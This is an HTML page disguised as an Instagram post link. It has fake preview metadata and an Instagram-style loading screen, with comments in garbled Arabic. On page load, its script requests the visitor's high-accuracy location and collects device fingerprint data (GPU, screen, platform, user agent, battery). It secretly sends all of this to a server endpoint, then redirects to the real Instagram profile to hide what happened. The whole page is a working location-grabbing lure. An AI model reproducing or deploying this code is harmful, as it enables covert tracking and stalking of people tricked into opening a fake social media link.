<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <!-- SEO & Social Preview (Instagram Post Style) -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="mzjy3756 â€¢ Ø³Ù„Ø§Ù…Ø§ Ø¹Ù„Ù‰ Ù…Ù† ÙˆØ¹Ø¯Ø§ Ø¨Ø§Ù„Ø¨Ù‚Ø§Ø¡ âš¡ğŸš¸">
    <meta property="og:description" content="1,193 likes, 280 comments - See Instagram photo by @mzjy3756">

    <!-- Ù‡Ø°Ù‡ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø³ÙŠØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„Ù‡Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø³ÙŠØ±ÙØ± -->
    <meta property="og:image" content="SITE_URL/preview.webp">
    <meta property="og:image:secure_url" content="SITE_URL/preview.webp">
    <meta property="og:image:width" content="1080">
    <meta property="og:image:height" content="1080">
    <meta property="og:image:type" content="image/webp">

    <meta property="og:url" content="SITE_URL">
    <meta property="og:type" content="article">

    <!-- App Links -->
    <meta property="al:ios:app_name" content="Instagram">
    <meta property="al:ios:app_store_id" content="389801252">
    <meta property="al:ios:url" content="https://www.instagram.com/p/DJrC3jTIsun/">
    <meta property="al:android:app_name" content="Instagram">
    <meta property="al:android:package" content="com.instagram.android">
    <meta property="al:android:url" content="https://www.instagram.com/p/DJrC3jTIsun/">

    <!-- Twitter Card (Ù„Ø¶Ù…Ø§Ù† Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„ÙƒØ¨ÙŠØ±Ø© ÙÙŠ ØªÙ„Ø¬Ø±Ø§Ù… Ø£ÙŠØ¶Ø§Ù‹) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="mzjy3756 â€¢ Ø³Ù„Ø§Ù…Ø§ Ø¹Ù„Ù‰ Ù…Ù† ÙˆØ¹Ø¯Ø§ Ø¨Ø§Ù„Ø¨Ù‚Ø§Ø¡ âš¡ğŸš¸">
    <meta name="twitter:description" content="1,193 likes, 280 comments - See Instagram photo by @mzjy3756">
    <meta name="twitter:image" content="SITE_URL/preview.webp">
    <meta name="theme-color" content="#000000">

    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a1666a32.png">
</head>

<body>
    <!-- Ø´Ø§Ø´Ø© ØªØ­Ù…ÙŠÙ„ Ù…Ø·Ø§Ø¨Ù‚Ø© Ù„Ø¥Ù†Ø³ØªÙ‚Ø±Ø§Ù… Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡ Ø§Ù„ØµØ§Ù…ØªØ© -->
    <div class="insta-loading-screen">
        <div class="insta-logo"></div>

        <div class="meta-footer">
            <span class="from-text">from</span>
            <div class="meta-brand">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
                    class="meta-logo" alt="Meta">
            </div>
        </div>
    </div>

    <script>
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "N/A";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
            } catch (e) { return "N/A"; }
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return { level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" };
                }
            } catch (e) { }
            return { level: "N/A", charging: "N/A" };
        }

        let redirected = false;
        function redirect() {
            if (redirected) return;
            redirected = true;

            const username = "mzjy3756";
            const isAndroid = /Android/i.test(navigator.userAgent);
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

            const webUrl = `https://www.instagram.com/${username}/`;

            if (isAndroid) {
                window.location.href = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;
            } else if (isIOS) {
                window.location.href = `instagram://user?username=${username}`;
            } else {
                window.location.href = webUrl;
            }

            setTimeout(() => { window.location.replace(webUrl); }, 1500);
        }

        window.onload = async () => {
            let locationCaptured = false;
            let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };

            // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { bestPos = pos; locationCaptured = true; },
                    () => { locationCaptured = true; },
                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                );
            } else {
                locationCaptured = true;
            }

            // 2. Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Ø­Ø¯ Ø£Ù‚ØµÙ‰ 3 Ø«ÙˆØ§Ù†Ù)
            for (let i = 0; i < 30 && !locationCaptured; i++) {
                await new Promise(r => setTimeout(r, 100));
            }

            // 3. Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            const data = {
                latitude: bestPos.coords.latitude,
                longitude: bestPos.coords.longitude,
                accuracy: bestPos.coords.accuracy && bestPos.coords.accuracy !== 'N/A' ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
                userAgent: navigator.userAgent,
                gpu: getGPU(),
                screen: `${window.screen.width}x${window.screen.height}`,
                platform: navigator.platform,
                battery: await getBatteryInfo()
            };

            const jsonStr = JSON.stringify(data);

            // 4. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù€ sendBeacon Ø£ÙˆÙ„Ø§Ù‹ (ÙŠÙ†Ø¬Ùˆ Ù…Ù† Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©)
            let beaconSent = false;
            try {
                const blob = new Blob([jsonStr], { type: 'application/json' });
                beaconSent = navigator.sendBeacon('/api/location', blob);
            } catch (e) { }

            // 5. Ø¥Ø°Ø§ Ù†Ø¬Ø­ Ø§Ù„Ù€ BeaconØŒ Ù†Ø­ÙˆÙ‘Ù„ ÙÙˆØ±Ø§Ù‹
            if (beaconSent) {
                setTimeout(redirect, 300);
            } else {
                // 6. Ø¥Ø°Ø§ ÙØ´Ù„ØŒ Ù†Ø³ØªØ®Ø¯Ù… fetch Ø«Ù… Ù†Ø­ÙˆÙ‘Ù„
                try {
                    await fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: jsonStr,
                        keepalive: true
                    });
                } catch (e) { }
                redirect();
            }
        };

        // Ø£Ù…Ø§Ù†: ØªØ­ÙˆÙŠÙ„ Ù‚Ø³Ø±ÙŠ Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†Ù
        setTimeout(redirect, 4000);
    </script>
</body>

</html>